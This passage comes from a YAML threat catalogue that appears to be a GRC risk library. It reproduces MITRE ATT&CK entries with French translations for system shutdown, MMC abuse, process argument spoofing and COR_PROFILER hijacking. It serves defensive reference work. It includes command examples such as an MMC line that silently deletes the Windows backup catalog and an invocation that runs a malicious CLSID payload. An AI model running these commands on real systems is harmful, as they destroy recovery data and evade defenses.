        description: "Les adversaires peuvent arr\xEAter/red\xE9marrer les syst\xE8\
          mes pour interrompre l\u2019acc\xE8s \xE0 ces syst\xE8mes ou aider \xE0\
          \ leur destruction. Les syst\xE8mes d\u2019exploitation peuvent contenir\
          \ des commandes permettant de lancer l\u2019arr\xEAt/le red\xE9marrage d\u2019\
          une machine ou d\u2019un p\xE9riph\xE9rique r\xE9seau. Dans certains cas,\
          \ ces commandes peuvent \xE9galement \xEAtre utilis\xE9es pour lancer l\u2019\
          arr\xEAt/le red\xE9marrage d\u2019un ordinateur distant ou d\u2019un p\xE9\
          riph\xE9rique r\xE9seau via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
          \ (par exemple, <code>reload</code>). (Citation : Fermeture de Microsoft\
          \ en octobre 2017)(R\xE9f\xE9rence : alert_TA18_106A)\n\nL\u2019arr\xEA\
          t ou le red\xE9marrage des syst\xE8mes peut perturber l\u2019acc\xE8s aux\
          \ ressources informatiques pour les utilisateurs l\xE9gitimes tout en entravant\
          \ la r\xE9ponse et la r\xE9cup\xE9ration en cas d\u2019incident.\n\nLes\
          \ adversaires peuvent tenter d\u2019arr\xEAter/red\xE9marrer un syst\xE8\
          me apr\xE8s l\u2019avoir affect\xE9 d\u2019autres mani\xE8res, telles que\
          \ [Effacement de la structure du disque](https://attack.mitre.org/techniques/T1561/002)\
          \ ou [Inhiber la r\xE9cup\xE9ration du syst\xE8me](https://attack.mitre.org/techniques/T1490),\
          \ afin d\u2019acc\xE9l\xE9rer les effets escompt\xE9s sur la disponibilit\xE9\
          \ du syst\xE8me. (R\xE9f\xE9rence : Talos Nyetya, juin 2017)(Citation :\
          \ Talos Olympic Destroyer 2018)\nhttps://attack.mitre.org/techniques/T1529"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.014
    ref_id: T1218.014
    name: MMC
    description: "Adversaries may abuse mmc.exe to proxy execution of malicious .msc\
      \ files. Microsoft Management Console (MMC) is a binary that may be signed by\
      \ Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation:\
      \ win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save\
      \ custom consoles that contain administrative tools created by Microsoft, called\
      \ snap-ins. These snap-ins may be used to manage Windows systems locally or\
      \ remotely. MMC can also be used to open Microsoft created .msc files to manage\
      \ system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc\
      \ C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console\
      \ msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc\
      \ gpedit.msc</code>, which will open the Group Policy Editor application window.\
      \ \n\nAdversaries may use MMC commands to perform malicious tasks. For example,\
      \ <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog\
      \ on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490))\
      \ without prompts to the user (Note: <code>wbadmin.msc</code> may only be present\
      \ by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation:\
      \ phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious\
      \ .msc files. For example, adversaries may first create a malicious registry\
      \ Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object\
      \ Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation:\
      \ win_clsid_key) Then, adversaries may create custom consoles with the \u201C\
      Link to Web Address\u201D snap-in that is linked to the malicious CLSID subkey.(Citation:\
      \ mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious\
      \ CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\\
      to\\test.msc</code>.(Citation: abusing_com_reg)\nhttps://attack.mitre.org/techniques/T1218/014"
    translations:
      fr:
        name: MMC
        description: "Les adversaires peuvent abuser de l\u2019ex\xE9cution mmc.exe\
          \ proxy de fichiers .msc malveillants. Microsoft Management Console (MMC)\
          \ est un fichier binaire qui peut \xEAtre sign\xE9 par Microsoft et qui\
          \ est utilis\xE9 de plusieurs fa\xE7ons dans son interface graphique ou\
          \ dans une invite de commandes. (R\xE9f\xE9rence : win_mmc)(R\xE9f\xE9rence\
          \ : what_is_mmc) MMC peut \xEAtre utilis\xE9 pour cr\xE9er, ouvrir et enregistrer\
          \ des consoles personnalis\xE9es contenant des outils d\u2019administration\
          \ cr\xE9\xE9s par Microsoft, appel\xE9s composants logiciels enfichables.\
          \ Ces composants logiciels enfichables peuvent \xEAtre utilis\xE9s pour\
          \ g\xE9rer les syst\xE8mes Windows localement ou \xE0 distance. MMC peut\
          \ \xE9galement \xEAtre utilis\xE9 pour ouvrir des fichiers .msc cr\xE9\xE9\
          s par Microsoft afin de g\xE9rer la configuration du syst\xE8me. (R\xE9\
          f\xE9rence : win_msc_files_overview)\n\nPar exemple, <code>mmc C\_:\\Users\\\
          foo\\admintools.msc /a</code> ouvrira un fichier msc de console personnalis\xE9\
          \ et enregistr\xE9 en mode auteur. (R\xE9f\xE9rence : win_mmc) Un autre\
          \ exemple courant est <code>mmc gpedit.msc</code>, qui ouvrira la fen\xEA\
          tre de l\u2019application \xC9diteur de strat\xE9gie de groupe. \n\nLes\
          \ adversaires peuvent utiliser des commandes MMC pour effectuer des t\xE2\
          ches malveillantes. Par exemple, <code>mmc wbadmin.msc delete catalog -quiet</code>\
          \ supprime le catalogue de sauvegarde sur le syst\xE8me (c\u2019est-\xE0\
          -dire [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490))\
          \ sans invite \xE0 l\u2019utilisateur (Remarque : <code>wbadmin.msc</code>\
          \ peut n\u2019\xEAtre pr\xE9sent par d\xE9faut que sur les syst\xE8mes d\u2019\
          exploitation Windows Server). (R\xE9f\xE9rence : win_wbadmin_delete_catalog)(R\xE9\
          f\xE9rence : phobos_virustotal)\n\nLes adversaires peuvent \xE9galement\
          \ abuser de MMC pour ex\xE9cuter des fichiers .msc malveillants. Par exemple,\
          \ les adversaires peuvent d\u2019abord cr\xE9er une sous-cl\xE9 CLSID (Registry\
          \ Class Identifier) malveillante, qui identifie de mani\xE8re unique un\
          \ objet de classe [Component Object Model](https://attack.mitre.org/techniques/T1559/001).\
          \ (R\xE9f\xE9rence : win_clsid_key) Ensuite, les adversaires peuvent cr\xE9\
          er des consoles personnalis\xE9es avec le composant logiciel enfichable\
          \ \xAB Lien vers l\u2019adresse Web \xBB qui est li\xE9 \xE0 la sous-cl\xE9\
          \ CLSID malveillante. (R\xE9f\xE9rence : mmc_vulns) Une fois le fichier\
          \ .msc enregistr\xE9, les adversaires peuvent appeler la charge utile CLSID\
          \ malveillante avec la commande suivante : <code>mmc.exe -Embedding C\_\
          :\\path\\to\\test.msc</code>. (R\xE9f\xE9rence : abusing_com_reg)\nhttps://attack.mitre.org/techniques/T1218/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.010
    ref_id: T1564.010
    name: Process Argument Spoofing
    description: 'Adversaries may attempt to hide process command-line arguments by
      overwriting process memory. Process command-line arguments are stored in the
      process environment block (PEB), a data structure used by Windows to store various
      information about/used by a process. The PEB includes the process command-line
      arguments that are referenced when executing the process. When a process is
      created, defensive tools/sensors that monitor process creations may retrieve
      the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation:
      Xpn Argue Like Cobalt 2019)


      Adversaries may manipulate a process PEB to evade defenses. For example, [Process
      Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn
      a process in a suspended state with benign arguments. After the process is spawned
      and the PEB is initialized (and process information is potentially logged by
      tools/sensors), adversaries may override the PEB to modify the command-line
      arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106)
      <code>WriteProcessMemory()</code> function) then resume process execution with
      malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue
      Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)


      Adversaries may also execute a process with malicious command-line arguments
      then patch the memory with benign arguments that may bypass subsequent process
      memory analysis.(Citation: FireEye FiveHands April 2021)


      This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004))
      to manipulate or further evade process-based detections.

      https://attack.mitre.org/techniques/T1564/010'
    translations:
      fr:
        name: "Usurpation d\u2019argument de processus"
        description: "Les adversaires peuvent tenter de masquer les arguments de ligne\
          \ de commande du processus en \xE9crasant la m\xE9moire du processus. Les\
          \ arguments de ligne de commande de processus sont stock\xE9s dans le bloc\
          \ d\u2019environnement de processus (PEB), une structure de donn\xE9es utilis\xE9\
          e par Windows pour stocker diverses informations sur/utilis\xE9es par un\
          \ processus. Le PEB inclut les arguments de ligne de commande du processus\
          \ qui sont r\xE9f\xE9renc\xE9s lors de l\u2019ex\xE9cution du processus.\
          \ Lorsqu\u2019un processus est cr\xE9\xE9, des outils/capteurs d\xE9fensifs\
          \ qui surveillent les cr\xE9ations de processus peuvent r\xE9cup\xE9rer\
          \ les arguments de processus \xE0 partir du PEB. (Citation : Microsoft PEB\
          \ 2021)(Citation : Xpn Argue Like Cobalt 2019)\n\nLes adversaires peuvent\
          \ manipuler un processus PEB pour \xE9chapper aux d\xE9fenses. Par exemple,\
          \ [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) peut\
          \ \xEAtre utilis\xE9 de mani\xE8re abusive pour g\xE9n\xE9rer un processus\
          \ dans un \xE9tat suspendu avec des arguments b\xE9nins. Une fois que le\
          \ processus est g\xE9n\xE9r\xE9 et que le PEB est initialis\xE9 (et que\
          \ les informations de processus sont potentiellement enregistr\xE9es par\
          \ les outils/capteurs), les adversaires peuvent remplacer le PEB pour modifier\
          \ les arguments de la ligne de commande (par exemple : \xE0 l\u2019aide\
          \ de la fonction <code>WriteProcessMemory()</code> [Native API](https://attack.mitre.org/techniques/T1106))\
          \ puis reprendre l\u2019ex\xE9cution du processus avec des arguments malveillants.\
          \ (Citation : Arguments sur la gr\xE8ve de Cobalt 2019)(Citation : Xpn Argue\
          \ Like Cobalt 2019)(Citation : Nviso Spoof Command Line 2020)\n\nLes adversaires\
          \ peuvent \xE9galement ex\xE9cuter un processus avec des arguments de ligne\
          \ de commande malveillants, puis corriger la m\xE9moire avec des arguments\
          \ b\xE9nins qui peuvent contourner l\u2019analyse ult\xE9rieure de la m\xE9\
          moire du processus. (Citation : FireEye FiveHands, avril 2021)\n\nCe comportement\
          \ peut \xE9galement \xEAtre combin\xE9 \xE0 d\u2019autres astuces (telles\
          \ que [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004))\
          \ pour manipuler ou \xE9chapper davantage aux d\xE9tections bas\xE9es sur\
          \ le processus.\nhttps://attack.mitre.org/techniques/T1564/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.012
    ref_id: T1574.012
    name: COR_PROFILER
    description: 'Adversaries may leverage the COR_PROFILER environment variable to
      hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER
      is a .NET Framework feature which allows developers to specify an unmanaged
      (or external of .NET) profiling DLL to be loaded into each .NET process that
      loads the Common Language Runtime (CLR). These profilers are designed to monitor,
      troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft
      Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)


      The COR_PROFILER environment variable can be set at various scopes (system,
      user, or process) resulting in different levels of influence. System and user-wide
      environment variable scopes are specified in the Registry, where a [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can
      be registered as a profiler DLL. A process scope COR_PROFILER can also be created
      in-memory without modifying the Registry. Starting with .NET Framework 4, the
      profiling DLL does not need to be registered as long as the location of the
      DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft
      COR_PROFILER Feb 2013)


      Adversaries may abuse COR_PROFILER to establish persistence that executes a
      malicious DLL in the context of all .NET processes every time the CLR is invoked.
      The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account
      Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET
      process executes at a higher permission level, as well as to hook and [Impair
      Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation:
      RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation:
      Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation:
      subTee .NET Profilers May 2017)

      https://attack.mitre.org/techniques/T1574/012'
    translations:
      fr:
        name: COR_PROFILER
        description: "Les adversaires peuvent exploiter la variable d\u2019environnement\
          \ COR_PROFILER pour d\xE9tourner le flux d\u2019ex\xE9cution des programmes\
          \ qui chargent le CLR .NET. Le COR_PROFILER est une fonctionnalit\xE9 du\
          \ .NET Framework qui permet aux d\xE9veloppeurs de sp\xE9cifier une DLL\
          \ de profilage non g\xE9r\xE9e (ou externe \xE0 .NET) \xE0 charger dans\
          \ chaque processus .NET qui charge le Common Language Runtime (CLR). Ces\
          \ profileurs sont con\xE7us pour surveiller, d\xE9panner et d\xE9boguer\
          \ le code g\xE9r\xE9 ex\xE9cut\xE9 par le CLR .NET. (Citation : Microsoft\
          \ Profiling mars 2017)(Citation : Microsoft COR_PROFILER f\xE9vrier 2013)\n\
          \nLa variable d\u2019environnement COR_PROFILER peut \xEAtre d\xE9finie\
          \ sur diff\xE9rentes \xE9tendues (syst\xE8me, utilisateur ou processus),\
          \ ce qui entra\xEEne diff\xE9rents niveaux d\u2019influence. Les \xE9tendues\
          \ des variables d\u2019environnement syst\xE8me et \xE0 l\u2019\xE9chelle\
          \ de l\u2019utilisateur sont sp\xE9cifi\xE9es dans le registre, o\xF9 un\
          \ objet [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
          \ (COM) peut \xEAtre enregistr\xE9 en tant que DLL de profileur. Une COR_PROFILER\
          \ d\u2019\xE9tendue de processus peut \xE9galement \xEAtre cr\xE9\xE9e en\
          \ m\xE9moire sans modifier le registre. \xC0 partir de .NET Framework 4,\
          \ il n\u2019est pas n\xE9cessaire d\u2019inscrire la DLL de profilage tant\
          \ que l\u2019emplacement de la DLL est sp\xE9cifi\xE9 dans la variable d\u2019\
          environnement COR_PROFILER_PATH. (Citation : Microsoft COR_PROFILER f\xE9\
          vrier 2013)\n\nLes adversaires peuvent abuser de COR_PROFILER pour \xE9\
          tablir une persistance qui ex\xE9cute une DLL malveillante dans le contexte\
          \ de tous les processus .NET chaque fois que le CLR est appel\xE9. Le COR_PROFILER\
          \ peut \xE9galement \xEAtre utilis\xE9 pour \xE9lever les privil\xE8ges\
          \ (par exemple : [Contourner le contr\xF4le de compte d\u2019utilisateur](https://attack.mitre.org/techniques/T1548/002))\
          \ si le processus .NET victime s\u2019ex\xE9cute \xE0 un niveau d\u2019\
          autorisation sup\xE9rieur, ainsi que pour accrocher et [Entraver les d\xE9\
          fenses](https://attack.mitre.org/techniques/T1562) fournis par les processus\
          \ .NET. (Citation : RedCanary Mockingbird, mai 2020)(Citation : Red Canary\
          \ COR_PROFILER mai 2020)(Citation : Almond COR_PROFILER avril 2019)(citation\
          \ : GitHub OmerYa Invisi-Shell)(Citation\_: subTee .NET Profilers mai 2017)\n\
          https://attack.mitre.org/techniques/T1574/012"
